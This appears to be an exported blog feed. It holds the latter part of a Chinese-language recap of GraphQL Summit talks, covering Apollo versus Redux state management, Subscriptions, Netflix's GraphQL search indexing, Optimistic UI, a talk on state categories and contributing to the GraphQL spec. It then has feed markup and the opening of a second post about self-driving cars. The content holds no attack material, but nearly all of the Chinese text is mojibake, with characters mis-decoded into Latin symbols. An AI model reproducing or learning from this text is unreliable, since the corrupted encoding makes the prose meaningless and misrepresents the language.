ç•¶æ‰€æœ‰ React Component éƒ½ç§»æ¤åˆ°äº† Apollo ä¸Šå¾Œï¼Œä»–å€‘é–‹å§‹æª¢è¦–å‰©é¤˜çš„ Redux state managementã€‚ä»–å€‘ç™¼ç¾æ‰€æœ‰åƒ…å­˜çš„ Redux Store æ‰€å„²å­˜çš„ç‹€æ…‹éƒ½èƒ½ç”¨ React Stateã€Context èˆ‡ Apollo cache + resolvers å–ä»£ã€‚
å¦‚æ­¤ä¸€ä¾†å°±èƒ½åœ¨æ•´å€‹ State management ä¸Šæœ‰ä¸€è‡´çš„ mental modelï¼Œä¸¦ä¸”æ¸›å°‘ Redux å¸¶ä¾†çš„ boilerplateï¼Œé‚„èƒ½äº«ç”¨ Apollo è‡ªå¸¶çš„ Caching åŠŸèƒ½ã€‚



æ¼”è¬›æœ€å¾Œå¥¹æåˆ°äº†ç›®å‰åœ˜éšŠæ­£åœ¨ç ”ç©¶çš„æ–¹å‘ï¼Œå…¶ä¸­çš„ Service Worker Query Pre-fetching å¾ˆæœ‰æ„æ€ï¼Œå¥¹ä»¥ Server-side rendering ç‚ºä¾‹ï¼Œæåˆ°å¯ä»¥å°‡ GraphQL Query å¾ Component level æ‹‰åˆ° route levelï¼Œå¦‚æ­¤ä¸€ä¾†å°±èƒ½é€é Service Worker ææ—©è§¸ç™¼ GraphQL Query requestï¼Œå¤§é‡ç¸®çŸ­ä½¿ç”¨è€…å¾çœ‹åˆ° Server-side rendered çš„ HTML èˆ‡é é¢å¯¦éš›èƒ½æ“ä½œçš„æ™‚é–“å·®ã€‚

Talksæ¥ä¸‹ä¾†æˆ‘æƒ³å…ˆä»‹ç´¹å…©å ´æˆ‘å°è±¡æœ€æ·±åˆ»çš„ Talksï¼Œä»¥å…å¤§å®¶å› ç‚ºå…§å®¹å¤ªé•·è€ŒéŒ¯éï¼Œé€™å…©å ´ Talks é™¤äº†å…§å®¹æ‰å¯¦å¤–ï¼Œå„è‡ªæœ‰ç¨ç‰¹ä¹‹è™•å€¼å¾—ä¸€æã€‚
useSubscription: A GraphQL Game Show (ALEX BANKS - Software Engineering Instructor at Moon Highway)Alex Banks åœ¨é€™å ´æ¼”è¬›ä¸­å„¼ç„¶æ˜¯å€‹ç¯€ç›®ä¸»æŒäººï¼Œå”±ä½œä¿±ä½³ï¼Œæ™‚é–“æŒæ§ä¹Ÿè¶…å¥½ï¼Œä»¥å……æ»¿äº’å‹•å¼çš„æ¼”è¬›å¸¶å‡º Subscription çš„ç”¨æ³•èˆ‡å¯¦ä½œä¸Šçš„è¦é»ã€‚æˆ‘åœ¨ä¹‹å‰å¾æ²’ä½¿ç”¨é SubScriptionï¼Œä½†çœ‹å®Œä»–çš„ Talk å¾Œï¼Œå°æ•´é«”é‹ä½œèˆ‡å¦‚ä½•ä½¿ç”¨æœ‰äº†éå¸¸æ¸…æ™°çš„è¼ªå»“ï¼Œæ¥µåŠ›æ¨è–¦å¤§å®¶é»é€²å½±ç‰‡è§€çœ‹æ•´å ´ Talkï¼Œçœ‹ä»–å¦‚ä½•ç¾å ´ç”¨ Mutation èˆ‡ SubScription åˆ‡æ›éŸ³æ¨‚ï¼Œåˆå¦‚ä½•ä»¥ â€œLive Codingâ€ çš„æ–¹å¼èªªæ˜ Client ç«¯éœ€è¦äº‹å…ˆ Setup å“ªäº›æ±è¥¿æ‰èƒ½è®“å‰å¾Œç«¯çš„ SubScription ä¸²æ¥èµ·ä¾†ã€‚

å¯¦éš›ä¸Š SubScription å°±æ˜¯é–‹å•Ÿä¸€å€‹ WebSocket é€£ç·šä¾† PubSub è³‡æ–™ ã€‚é€é SubScriptionï¼Œèƒ½è¼•æ˜“å¯¦ä½œå‡ºäº’å‹•éŠæˆ²ï¼Œä¾‹å¦‚ä»–åœ¨ç¾å ´ç”¨ Mutation trigger ä¸€å€‹ Questionï¼Œç¾å ´è½çœ¾åªè¦é€£é€²ä»–çš„ä¼ºæœå™¨å°±æœƒæ¥æ”¶åˆ°å•é¡Œï¼Œä¸¦ä¸”é€²è¡Œå›ç­”ï¼Œ ä½¿ç”¨è€…é€éå¦ä¸€å€‹ Mutation å°‡ç­”æ¡ˆæ¨å› Serverï¼Œæ›´æ–°ç‹€æ…‹å¾Œï¼ŒSubScription å†æ¨å›çµ¦æ‰€æœ‰ Client ç«¯ã€‚
å½±ç‰‡ä¸­ä»–åˆ©ç”¨ ApolloLink Interface ä¸­æä¾›çš„ Split å‡½å¼ä¾†å€åˆ†é€²ä¾†çš„ Query è¦ä½¿ç”¨ä¸€èˆ¬çš„ HttpLink æˆ–æ˜¯éœ€è¦ SubScription è™•ç†ã€‚
å¦å¤–æ¼”è¬›çš„æœ€å¾Œï¼Œä»–æåˆ° Apollo æä¾›çš„ PubSub æ˜¯é‹è¡Œåœ¨ä½  Nodejs çš„å–®ã„§ Instance ä¸Šçš„ï¼Œæ‰€ä»¥ç•¶ä½ çš„ service éœ€è¦ scale æ™‚ï¼Œå°±å¿…é ˆè¦æ³¨æ„ï¼Œå¯èƒ½æ¡ç”¨ Redis æœƒæ˜¯æ¯”è¼ƒå¥½çš„æ›¿ä»£é¸æ“‡ã€‚
éå¸¸æœ‰è¶£çš„ä¸€å ´æ¼”è¬›ï¼Œç¯€å¥æµæš¢ï¼Œèªªæ˜æ¸…æ™°ï¼Œä¹Ÿç‚ºä»–èˆ‡ä»–è€å©†å‰µè¾¦çš„ç¨‹å¼æ•™è‚²å¹³å° Moon Highway æ‰“äº†æœ€å¥½å»£å‘Šï¼Œä»–ä¹Ÿæœ‰å‡ºç‰ˆä¸€äº›æ›¸ç±ï¼šLearning GraphQLã€Learning Reactã€‚
GraphQL Search (Artem Shtatnov, Software Engineer at Netflix)é€™å ´ Talk æˆ‘æ˜¯è¡è‘—è¬›è€…ä¾†è‡ª Netflix å»è½çš„ï¼Œå¯¦éš›ä¸Šçš„å…§å®¹å› ç‚ºæ²’æœ‰æ¥è§¸å¤ªå¤š Search åŠŸèƒ½ï¼Œæ‰€ä»¥è½èµ·ä¾†æ„Ÿå—ä¸æ·±ã€‚æœƒæƒ³ç‰¹åˆ¥æé€™å ´æ¼”è¬›æ˜¯å› ç‚ºï¼Œè¬›è€…æœ¬èº«æ‡‰è©²æ˜¯æœ‰å¦¥ç‘ç—‡ï¼Œæƒ³ç•¶ç„¶çˆ¾ï¼Œæ¼”è¬›çš„éç¨‹å°±ä¸å¦‚ä»–äººé †æš¢ï¼Œå¾è‡ªæˆ‘ä»‹ç´¹é–‹å§‹ï¼Œå¤§å®¶å°±æ³¨æ„åˆ°äº†ï¼Œç•¶æ™‚æˆ‘ç‰¹æ„è§€å¯Ÿäº†åœ¨å ´çš„è½çœ¾ï¼Œè »è¨ç•°çš„æ˜¯é‚„æ˜¯æœ‰å°‘æ•¸äººéœ²å‡ºäº›è¨±ä¸è€çš„è¡¨æƒ…ï¼Œä½†è¬›è€…å¾ˆèªçœŸçš„è¬›å®Œæ•´å ´ï¼Œè€Œä¸”å…¶å¯¦å…§å®¹å¾ˆæ¸…æ¥šï¼ŒçµæŸå¾Œçš„æŒè²æ¯”èµ·å‰é¢å¹¾ä½è¬›è€…éƒ½å¤§äº†å¾ˆå¤šã€‚
ç°¡å–®ä»‹ç´¹ä¸€ä¸‹æ¼”è¬›å…§å®¹ï¼Œæ˜¯ä»‹ç´¹ Netflix å¦‚ä½•æ ¹æ“š data graph è£¡å­˜åœ¨çš„ graph edges ä¾†å»ºç«‹ Search Indicesï¼Œé€²è€Œåœ¨æ•´å€‹ Graph ä¸Šé€²è¡Œæœ‰æ•ˆæœå°‹ã€‚
ä¸»è¦åˆ©ç”¨ Kafka ä¾†è™•ç† change eventï¼Œå‘ŠçŸ¥ Indexer æœ‰æ”¹è®Šç™¼ç”Ÿï¼›GraphQL é‡å° change æ”¹è®Šè³‡æ–™ï¼›Elasticsearch ä½œç‚º Search database å„²å­˜è³‡æ–™ã€‚é€™ä¸‰è€…çµ„åˆæˆä»–å€‘çš„ Search Indexerã€‚
ä½ å¯ä»¥åœ¨ä»–å€‘çš„å®˜æ–¹ Blog ä¸Šæ‰¾åˆ°æ–‡å­—ç‰ˆçš„èªªæ˜ã€‚
å¦å¤–é™„ä¸Šè¬›è€…çš„ç¶²ç«™ï¼šartemshtatnov.com
Components as Data: A Cross Platform GraphQL Powered Component API (Luke Herrington, Senior Javascript Engineer at Four Kitchens)é€™ä½è¬›è€…åœ¨æˆ‘å€‘ç¬¬ä¸€å¤©åˆé¤æ™‚ï¼Œå‰›å¥½è·Ÿæˆ‘å€‘åšåŒä¸€æ¡Œï¼ŒèŠå¤©éç¨‹ä¸­å¾—çŸ¥ä»–åœ¨åšçš„æ±è¥¿ï¼Œè·Ÿæˆ‘æ‰‹ä¸Šç›®å‰çš„ä¸€å€‹å°ˆæ¡ˆåšçš„äº‹æƒ…ç°¡ç›´ä¸€æ¨¡ä¸€æ¨£ï¼Œæ‰€ä»¥å°±å»è½äº†ä»–çš„æ¼”è¬›ã€‚
åŸºæœ¬ä¸Šä»–çš„æƒ³æ³•æ˜¯ï¼Œè®“å‰ç«¯é é¢çš„ Layout èˆ‡ Component çµ„æˆè³‡è¨Šäº¤ç”±å¾Œç«¯ä¾†å„²å­˜èˆ‡æ±ºå®šï¼Œå‰ç«¯åªéœ€è¦ Mapping çœŸæ­£çš„ Component ç¨‹å¼ç¢¼ï¼Œé€™æ¨£ä¸€ä¾† PM æƒ³è¦èª¿æ•´ Layoutï¼Œæˆ–æ˜¯éœ€è¦ A&#x2F;B Testingã€è¨­ç½® Feature Flag æ™‚ï¼Œåªéœ€è¦æ›´å‹•å¾Œç«¯è³‡æ–™ï¼Œå‰æ®µå°±èƒ½è‡ªå‹•åæ‡‰ã€‚
é€™ç¨®ä½œæ³•åœ¨æˆ‘æ‰‹ä¸Šçš„å°ˆæ¡ˆå¾ˆé©åˆï¼Œå› ç‚ºä½¿ç”¨æƒ…å¢ƒçš„åˆ‡åˆã€‚ä½†å°æˆ‘å€‘ä¾†èªªï¼Œå› ç‚ºä¸æ˜¯æ¯å€‹é é¢éƒ½æœƒç”¨åˆ°æ‰€æœ‰çš„ Componentï¼Œè‹¥æ˜¯å‰ç«¯éœ€è¦å­˜æ”¾ä¸€å€‹åŒ…å«æ‰€æœ‰ Component çš„ Mapï¼Œæœƒè »æµªè²»çš„ï¼Œå› æ­¤éœ€è¦ Dynamic loadingï¼Œè€Œ Dynamic loading åˆ°äº† SSR ä¸Šåˆæ˜¯å¦ä¸€å€‹éœ€è¦è™•ç†çš„éº»ç…©äº‹å‹™ã€‚
æ¼”è¬›çµæŸå¾Œæˆ‘æœ‰å»å‘ä»–è©¢å•é¡ä¼¼å•é¡Œï¼Œæƒ³çŸ¥é“ä»–æ˜¯å¦‚ä½•è§£æ±ºå‰ç«¯éœ€è¦å„²å­˜ä¸€å€‹ Component Mapï¼Œä½†å¯èƒ½ä¸æ˜¯æ¯å€‹é é¢éƒ½æœƒç”¨åˆ°æ‰€æœ‰ Componentï¼Œé€™ç¨®è³‡æºæµªè²»çš„å•é¡Œï¼Œä½†æœç„¶ä»¥ä»–çš„ Use Case ä¾†èªªï¼Œä¸¦ä¸å¤ªéœ€è¦è€ƒæ…®åˆ°é€™å•é¡Œã€‚ä½†å³ä¾¿å¦‚æ­¤ï¼Œçœ‹åˆ°è‡ªå·±å¹³å¸¸å¯¦ä½œä¸Šç”¨åˆ°çš„æ¶æ§‹è¢«åŒ…è£æˆä¸€å€‹æ¼”è¬›çš„ Topic æ„Ÿè¦ºé‚„æ˜¯è »æœ‰è¶£ã€‚
Optimistic UI: Predicting the Future (KENNY HAMMERLUND)é€™å ´æ˜¯ Lighting talkï¼Œè¢«åå­—å¸å¼•è€Œä¾†ï¼Œå¾Œä¾†ç™¼ç¾å…¶å¯¦ä»–åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œè€Œä¸”å¤§éƒ¨åˆ†å‰ç«¯æ‡‰è©²éƒ½æ˜¯é€™éº¼åšçš„ã€‚
æƒ³åƒä¸€ä¸‹ä½ åœ¨è£½ä½œä¸€å€‹ç•™è¨€ç‰ˆï¼Œç•¶ä½¿ç”¨è€…ç·¨è¼¯æˆ–æ˜¯æ–°å¢ç•™è¨€æ™‚ï¼Œä½ æœƒé€å‡º Request å¾Œï¼Œé‡æ–°å†å¾ Server ç«¯æ‹‰ä¸€æ¬¡è³‡æ–™ï¼Œé‚„æ˜¯ä½ æœƒå°‡ Local state ç›´æ¥æ›´æ”¹å‘¢ï¼Ÿç›¸ä¿¡å¤šæ•¸äººæœƒæ¡ç”¨å‰è€…åšæ³•ã€‚
é€™å ´æ¼”è¬›å°±æ˜¯åœ¨è¬›é€™ä»¶äº‹ï¼Œåªæ˜¯èªªï¼ŒApollo Client è®“é€™ä»¶äº‹è®Šå¾—éå¸¸å®¹æ˜“ï¼Œå®ƒæä¾›çš„ Optimistic Functionï¼Œè®“ä½ åœ¨ Query ä¸­æŒ‡å®šè©²å¦‚ä½•åœ¨ Server è³‡æ–™é‚„æœª Response æ™‚ï¼Œå…ˆè¡Œæ›´æ–°è³‡æ–™ã€‚

ä¹Ÿå¯ä»¥åƒè€ƒ Apollo å®˜æ–¹ç¶²ç«™ä¸Šçš„æ–‡ç« ï¼šOptimistic UI
A Treatise on State (Jed Watson, Partner at Thinkmill)é€™å ´ Talk è·Ÿ GraphQL é—œä¿‚ä¸å¤§ï¼Œä½†æˆ‘è¦ºå¾—è »æœ‰æ„æ€çš„ï¼Œè¬›è€…æ¢è¨æˆ‘å€‘åœ¨é€²è¡Œ State management çš„åŒæ™‚ï¼Œæ‡‰è©²è¦å…ˆé‡å° State é€²è¡Œåˆ†é¡ï¼Œæ ¹æ“šä¸åŒçš„åˆ†é¡ç”¨ä¸åŒçš„æ–¹å¼ç®¡ç†ã€‚

è¬›è€…å°‡ State åˆ†é¡ç‚ºäº”é¡ï¼š

Local State
Component Stateï¼ˆå…ƒä»¶å…§çš„ç‹€æ…‹ï¼‰
Form Stateï¼ˆè¡¨å–®å…§çš„ç‹€æ…‹ï¼‰
UI Stateï¼ˆå…¶ä»– UI æ“ä½œæ›´å‹•çš„ç‹€æ…‹ï¼‰
æœ€åŸºæœ¬çš„ç‹€æ…‹ï¼Œé€šå¸¸æœƒä»¥ Props æ–¹å¼å‚³éçµ¦å…¶ä»– Component


Shared State
App State
Data (cache or store)
UI State (Shared concerns)
åªæœ‰åœ¨ä½ çŸ¥é“ä½ éœ€è¦ Shared state æ™‚ï¼Œæ‰éœ€è¦ä¾†å­˜å–
Local state è¦è®Šæˆ Shared State çš„å…ˆæ±ºæ¢ä»¶åœ¨æ–¼ï¼Œå…©å€‹æˆ–ä»¥ä¸Šçš„å…ƒä»¶éœ€è¦å­˜å–ã€æ“ä½œåŒä¸€å¡Š Stateã€‚ä¸éè¦æ³¨æ„ Props drillingï¼Œè©²ä»¥ Context æ–¹å¼é€²è¡Œå…±äº«ã€‚


Remote State
ä½ ä¸æ“æœ‰çš„ç‹€æ…‹
ä½ å¯èƒ½æœƒéœ€è¦ Cache å®ƒï¼Œæˆ–æ˜¯å¾è©²ç‹€æ…‹å–å¾—å¦å¤–çš„å€¼
Local changes æœƒé€é API ä¾†èˆ‡å…¶é€²è¡Œ Sync
è©²ç‹€æ…‹æ°¸é æ˜¯ async ä¸”ä¸å¯é çš„
è¬›è€…æ²’æœ‰çµ¦å¾ˆæ˜ç¢ºçš„ä¾‹å­ï¼Œä½†ä¾æˆ‘ç†è§£ï¼ŒæŒ‡çš„æ˜¯ Server ç«¯æä¾›çš„è³‡æ–™ç‹€æ…‹ã€‚


Meta State
æä¾›çµ¦ä½ åƒè€ƒçš„ç‹€æ…‹ï¼Œä½ ä¸æ˜¯ç‹€æ…‹çš„ä¾†æº
æœ‰ API æœƒæ”¹è®Šå…¶ç‹€æ…‹
Always respect it
ä¸æ˜¯ Remote State çš„ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯å¸¸å¸¸ä¸€èµ·å‡ºç¾
èˆ‰ä¾‹ä¾†èªªï¼Œinput box çš„ Auto complete åŠŸèƒ½ï¼Œç•¶ä½  Typing æ™‚ï¼Œç­‰å¾… response æ™‚çš„ Loading stateã€‚


Router State
æä¾›çµ¦ä½ åƒè€ƒçš„ç‹€æ…‹ï¼Œä½ ä¸æ˜¯ç‹€æ…‹çš„ä¾†æº
æœ‰ API æœƒæ”¹è®Šå…¶ç‹€æ…‹
ä¸æ˜¯ Remote State çš„ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯å¸¸å¸¸ä¸€èµ·å‡ºç¾
æº–å‰‡èˆ‡ meta state ç›¸åŒï¼Œä¸»è¦æŒ‡çš„æ˜¯ç•¶ä½ ç¶²ç«™çš„ Route æ”¹è®Šæ™‚ï¼Œä½ é€šå¸¸æœƒå› æ‡‰è€Œå‘ˆç¾ä¸åŒçš„ Componentï¼Œé€™å°±æ˜¯ Router Stateã€‚



è¬›è€…æåˆ°å¹¾é»å¾ Redux è½‰æ›åˆ° Apollo ä¾†ç®¡ç† State æ™‚çš„å¥½è™•ï¼ŒåŸºæœ¬ä¸Šæ¸›å°‘äº†å¤§é‡çš„ç¨‹å¼ç¢¼ï¼Œä¸¦æé«˜äº† codebase é–“çš„é€æ˜åº¦ï¼š

é€é Apolloï¼Œä½ å¯ä»¥åªé¸æ“‡ä½ æƒ³è¦çš„ Dataï¼Œæ‹¿åˆ°è³‡æ–™å¾Œä¹Ÿä¸éœ€è¦é¡å¤–çš„è½‰æ›å‡½å¼ä¾†è™•ç†è³‡æ–™ã€‚
è³‡æ–™çš„ Request èˆ‡ Component æ˜¯æ”¾åœ¨ä¸€èµ·çš„ã€‚
Meta State ç›´æ¥ç”± Apollo è‡ªå‹•å¹«ä½ è™•ç†å¥½ã€‚


Donâ€™t solve problems when you can stop having them

æ¼”è¬›æœ€å¾Œçš„ç¸½çµæ˜¯å»ºè­°å¤§å®¶å»ºç«‹å®Œæ•´å°è£çš„ Componentï¼Œæ¯å€‹ Component ç®¡ç†è‡ªå·±çš„ Stateï¼Œç„¶å¾Œçµ„åˆé€™äº› Component ä¾†å®Œæˆè¤‡é›œçš„ UIã€‚ä¸è¦è©¦åœ–é¸æ“‡å–®ä¸€æ¡†æ¶ä¾†ç®¡ç† Stateï¼Œæ‡‰è©²ä¾æ“šä¸åŒé¡å‹çš„ Type ä¾†é¸æ“‡ä¸åŒçš„æ¡†æ¶è™•ç†ã€‚åªè¦ä½ è¶Šäº†è§£æ¯å€‹ç‹€æ…‹çš„å€åˆ¥ï¼Œè¶ŠçŸ¥é“è©²å¦‚ä½•ç”¨ä¸åŒçš„ç­–ç•¥ç®¡ç†ä»–å€‘ï¼Œé‚£éº¼ç”¨ä»€éº¼å·¥å…·ä¾†ç®¡ç†ç‹€æ…‹å°±æ„ˆä¸é‡è¦ã€‚
How do you get changes made to GraphQL? (Orta, Engineer On Typescript at Microsoft)é€™å ´æ¼”è¬›çš„å…§å®¹èˆ‡å…¶ä»–å¾ˆä¸ç›¸åŒï¼Œè¬›è€…æœ¬èº«è³‡æ­·è±å¯Œä¸èªªå¤–ï¼Œåˆ¥çš„è¬›è€…éƒ½æ˜¯åœ¨èªªæ€éº¼ä½¿ç”¨ GraphQLï¼Œä½†é€™å ´æ˜¯åœ¨ä»‹ç´¹ GraphQL Fundation çš„æ­·å²ï¼Œä»¥åŠå¦‚ä½•åƒèˆ‡ GraphQL Specs æˆ–æ˜¯å…¶ä»– first-party projects çš„ææ¡ˆä¿®æ”¹ã€‚å¾ GraphQL çš„æ­·å²ç°¡çŸ­ä»‹ç´¹é–‹å§‹ï¼Œåˆ°å¦‚ä½•ææ¡ˆï¼Œèˆ‡å…¶éç¨‹ç‚ºä½•ã€‚
å…¶ä¸­è¬›è€…æœ‰æåˆ° Youtube ä¸Šçš„ä¸€å€‹ç´€éŒ„ç‰‡ï¼ŒGraphQL: The Documentaryï¼ŒåŠå°æ™‚çš„å…§å®¹ï¼Œä»‹ç´¹äº† GraphQL çš„ä¾†é¾å»è„ˆï¼Œæ¨æ¨ï¼
ç¸½ä¹‹åœ¨ä¸€é€£ä¸²çš„æ­·å²ç™¼å±•èˆ‡å„å¤§å…¬å¸é–“çš„åˆä½œå¾Œï¼Œæœ‰äº†ç¾åœ¨çš„ GraphQL Fundationï¼Œè² è²¬çµ±ç±Œèˆ‡ç™¼å±• GraphQL Ecosystemã€‚ä»–å€‘æœ‰ç¶­è­·ä¸€ä»½ GraphQL Landscapeï¼Œè®“ä½ èƒ½å®è§€çš„äº†è§£æ•´å€‹ Ecosystem çš„ç‹€æ…‹ï¼š

æ­¤å¤–ï¼ŒGraphQL Fundation çš„æœƒå“¡æ˜¯éœ€è¦ä»˜æœƒå“¡è²»çš„ï¼Œç­‰åŒæ–¼ç¶­è­·é€™å€‹ Fundation çš„äººæ˜¯ get paid çš„ï¼Œè€Œæœƒå“¡æœ‰æ¬Šæ±ºå®šçµ„ç¹”èµ°å‘èˆ‡é ç®—é–‹éŠ·ã€‚
GraphQL.org ä¸»è¦è² è²¬å¹¾é …äº‹ç‰©ï¼ŒåŒ…å« Specã€Reference Implementations èˆ‡ GraphiQL ä»¥åŠ Branding å’Œå‰›å‰›æåˆ°çš„ Landscape ç­‰ç­‰ã€‚
æ­¤å¤–æœ‰å…©å€‹ Working Groupï¼šGraphQL Working Group &amp; GraphiQL Working Groupã€‚æ¯å€‹ Working Group éƒ½æœ‰ Agendasï¼Œéƒ½æ”¾åœ¨ github ä¸Šé ­ï¼Œå¯ä»¥ follow äº†è§£æœ€æ–°ç™¼å±•ã€‚
æƒ³è¦åƒèˆ‡ Working Groupï¼Œä»–å€‘æœ‰ä¸€äº› guideline éœ€è¦éµå®ˆï¼š

è¦é‡å° GraphQL Spec é€²è¡Œæ›´å‹•ï¼Œæœ‰å¹¾å€‹éšæ®µéœ€è¦åŸ·è¡Œï¼š

Strawperson - é€™éšæ®µæŒ‡çš„æ˜¯ä½ å¯èƒ½åœ¨ GitHub ä¸Šé–‹äº† Issueï¼Œæ¥å—å¤§å®¶å„ç¨®æ„è¦‹çš„â€è¡æ“Šâ€ï¼Œé€²è€Œåè¦†ä¿®æ”¹ä½ çš„æƒ³æ³•ã€‚
Proposal - é€™éšæ®µæ˜¯ä½ å¯ä»¥é–‹å§‹æ€è€ƒç™¼ Pull Requestï¼Œç„¡è«–æ˜¯ä¿®æ”¹ Spec æˆ–æ˜¯ Reference Implementationï¼Œæ¥å—å¤§å®¶ä¸åŒé¢ç›¸çš„æ„è¦‹ã€‚
Draft - ç”¨æ­£ç¢ºçš„ Syntax èˆ‡ Format å»æ›´æ”¹ Spec æˆ– Implemenatonã€‚
Accepted - æœ€å¾Œéšæ®µå°±æ˜¯ä½ çš„ææ¡ˆè¢« Acceptedï¼Œç„¶å¾Œåœ¨ä¸‹ä¸€æ¬¡çš„ Release ä¸­è¢«é‡‹å‡ºã€‚

ä¸éä½ çš„ææ¡ˆç•¶ç„¶ä¹Ÿæœ‰å¯èƒ½è¢« Rejectedï¼Œé€™æ™‚å¯ä»¥åƒè€ƒ GraphQL çš„ Guiding Principlesï¼Œæ‰¾å‡ºå•é¡Œç™¥çµï¼š

ä¸Šè¿°æ˜¯æ›´å‹•æ‰€éœ€è¦çš„æ­¥é©Ÿï¼Œè€Œå¦‚ä½•åƒèˆ‡çš„æ­¥é©Ÿå¦‚ä¸‹ï¼š

Have an Idea
Join a working group
Pitch
Start doing work

æ­¥é©Ÿç°¡å–®ï¼Œä½†å°±å¦‚åŒä¸€èˆ¬åƒèˆ‡ Open Source project ä¸€æ¨£ï¼Œä½ çš„ PR å¯èƒ½å¾ˆä¹…éƒ½ä¸æœƒè¢« Merge é€²å»ï¼Œéœ€è¦æœ‰è¶³å¤ æ¯…åŠ›ï¼Œä¸¦èªçŸ¥åˆ°æ¯å€‹äººçš„æ™‚é–“éƒ½å¾ˆæœ‰é™ï¼Œä¸è¦çµ¦è‡ªå·±å¤ªå¤šå£“åŠ›ã€‚
Other Talksåœ¨æˆ‘åƒèˆ‡çš„è­°ç¨‹ä¸­ï¼Œé‚„æœ‰å…©å€‹æˆ‘è¦ºå¾—å…§å®¹è »ä¸éŒ¯å€¼å¾—ä¸€çœ‹çš„æ˜¯ï¼šGame Of Types: A Song Of GraphQL And TypeScript (Steven Musumeche, Senior Software Engineer at Formidable) èˆ‡ How We Scaled GraphQL at The New York Times (James Lawrie, Lead Software Engineer at NYT)ã€‚
ç¤™æ–¼æ™‚é–“èˆ‡ç¯‡å¹…ï¼Œæˆ‘æš«æ™‚å…ˆå¯«åˆ°é€™é‚Šï¼Œå¾ŒçºŒè‹¥æœ‰æ™‚é–“æœƒå†ä¾†è£œä¸Šé€™å…©ç¯‡çš„é‡é»åˆ†äº«ï¼Œæœ‰èˆˆè¶£çš„è®€è€…æ¨è–¦åˆ°å½±ç‰‡é€£çµå»è§€çœ‹ã€‚
çµè«–GraphQL Summit æ•´é«”ä¾†èªªæ˜¯éå¸¸æ£’çš„æœƒè­°ï¼Œå…§å®¹è±å¯Œå¤–ï¼Œå‹•ç·šè¦åŠƒèˆ‡è­°ç¨‹ä¸­çš„ Topic tables èˆ‡ Sponsor Booth éƒ½è¦åŠƒå¾—ä¸éŒ¯ï¼Œå³ä½¿è©²æ™‚æ®µæ²’æœ‰æœ‰èˆˆè¶£çš„ Talkï¼Œå ´å¤–ä¹Ÿå¾ˆå¤šè´ŠåŠ©å•†æˆ–æ˜¯ Apollo çš„å“¡å·¥å¯ä»¥è·Ÿä½ è¨è«–èŠå¤©ã€‚ç¾ä¸­ä¸è¶³çš„æ˜¯ç¬¬äºŒå¤©æœ‰äº›å ´åœ°ä¸çŸ¥ç‚ºä½•çªç„¶é™åˆ¶äººæ•¸ï¼Œé€£åœ¨å ´å…§ç«™è‘—è½éƒ½ç„¡æ³•ï¼Œæ‰€ä»¥æˆ‘éŒ¯éäº†ä¸€äº›å ´æ¬¡ï¼Œä½†å¥½åœ¨ä»–å€‘éƒ½æœ‰ä¸Šå‚³å½±ç‰‡ï¼Œä»–å€‘ç”šè‡³å› ç‚ºæœ‰ä¸€å ´æ¼”è¬›æ²’æœ‰éŒ„åˆ°å½±ï¼ŒæŠŠè¬›è€…å†è«‹å›ä¾†é‡æ–°æ¼”è¬›ä¸€æ¬¡ã€‚
å¾ä»Šå¹´çš„ GraphQL Summit ä¾†çœ‹ï¼ŒGraphQL çš„ç™¼å±•å·²ç¶“é —æˆç†Ÿï¼ŒApollo å»ºé€ çš„ Ecosystem ä¹Ÿå¾ˆå‹å–„ï¼Œä¹‹å¾Œæˆ‘æ‡‰è©²ä¹Ÿæœƒç›¡é‡æ‰¾æ©Ÿæœƒå°‡å…¶æ¡ç”¨è‡³å…¶ä»–å°ˆæ¡ˆä¸­ï¼è‹¥ä½ é‚„æ²’å°å…¥ GraphQL åˆ°å°ˆæ¡ˆä¸­çš„ä¸ä»¿è©¦è©¦ï¼Œå¯ä»¥åˆ°å°ç£çš„ GraphQL ç¤¾ç¾¤ - https://www.facebook.com/groups/graphql.tw/ æå•è¨è«–ã€‚
æœ€å¾Œé™„ä¸Šå¹¾å¼µåŠ å·æ™¯è‰²ä½œç‚ºçµæŸï¼š


é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
  </entry>
  <entry>
    <title>ä¸€èµ·ä¾†ç”¨ååˆ†é˜ç•¥æ‡‚è‡ªé§•è»Šå§ï¼GoGoGoï¼</title>
    <url>/2017/06/21/Lets-know-a-little-bit-of-Self-Driving-Car/</url>
    <content><![CDATA[[ å‰è¨€ ]å°å¼Ÿæˆ‘ä¸¦æ²’æœ‰è‡ªé§•è»Šé ˜åŸŸçš„å·¥ä½œç¶“é©—ï¼Œä»¥ä¸‹åªæ˜¯#æˆ‘çš„è§€å¯Ÿå•¦ã€‚å¸Œæœ›è®€è€…èƒ½è—‰æ­¤ç•¥æ‡‚è‡ªé§•è»Šï¼Œæœ‰éŒ¯çš„åœ°æ–¹æ­¡è¿æŒ‡æ­£ã€‚
æ­¤æ–‡ç« çš„æ¶æ§‹ç‚º Why-What-How çš„ä¸‰å¤§æ®µè½ï¼š

Why - ç‚ºä»€éº¼è‡ªé§•è»Šå¾ˆé‡è¦å‘¢
What - ä»€éº¼æ˜¯è‡ªé§•è»Š
How - è‡ªé§•è»Šæ˜¯å¦‚ä½•é‹ä½œçš„

é‚£éº¼é–‹å§‹å§ï¼ŒGoGoGoï¼


[ ç‚ºä»€éº¼è‡ªé§•è»Šå¾ˆé‡è¦å‘¢ ]ä¸»è¦æœ‰ä¸‰å€‹åŸå› ï¼Œå› ç‚ºï¼š

è‡ªé§•è»Šå¯ä»¥æ•‘å¤§å®¶çš„å‘½
è‡ªé§•è»Šå¯ä»¥ç¯€çœå¤§å®¶çš„æ™‚é–“
è‡ªé§•è»Šå¯ä»¥è³ºå¥½å¤šå¥½å¤šéŒ¢

